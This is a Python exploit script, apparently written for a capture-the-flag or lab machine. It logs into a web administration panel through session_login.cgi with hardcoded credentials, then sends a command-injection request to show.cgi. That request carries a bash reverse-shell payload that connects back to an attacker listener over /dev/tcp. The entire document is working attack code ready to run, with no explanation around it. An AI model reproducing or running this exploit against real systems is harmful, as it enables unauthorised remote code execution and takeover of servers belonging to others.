import requests
import string, secrets

LHOST = "10.6.14.172"
LPORT = 4444

TARGET_IP = "10.10.192.92"
TARGET_PORT = 80

#Main function
def main():
	print("Starting...")

	print("Creating payload for: LHOST: {LHOST} and LPORT: {LPORT}")
	payload = get_payload(LHOST, LPORT)
	print("[+] Payload successfully created!")

	print("Trying to login.")
	cookie = login()
	if (cookie != None):
		print("Cookie: " + cookie)
		print("[+] Login successfull!")
	else:
		print("[-] Failed to login!")
		return -1

	print("Generating random characters")
	chars = rand()
	print("Random chars: " + chars)

	print("Executing exploit")
	post_exploit(chars, payload, cookie)

def post_exploit(chars, payload, cookie):
	exp = f"http://{TARGET_IP}:{TARGET_PORT}/file/show.cgi/bin/{chars}|{payload}|"
	req = requests.post(exp, cookies={"sid":cookie}, verify=False, allow_redirects=False)


def get_payload(lhost, lport):
	return f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"

def login():
	data = {
		'page' : "%2F", 
		'user' : "user1", 
		'pass' : "1user"
	}

	url = f"http://{TARGET_IP}:{TARGET_PORT}/session_login.cgi"

	r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

	if (r.status_code == 302 and r.cookies["sid"] != None):
		return format_cookie(r)
	else:
		return None

def format_cookie(r):
	c = r.cookies["sid"]
	return c.strip("/=; ")


def rand():
	alphaNum = string.ascii_letters + string.digits
	return ''.join(secrets.choice(alphaNum) for i in range(5))

if __name__ == "__main__":
	main()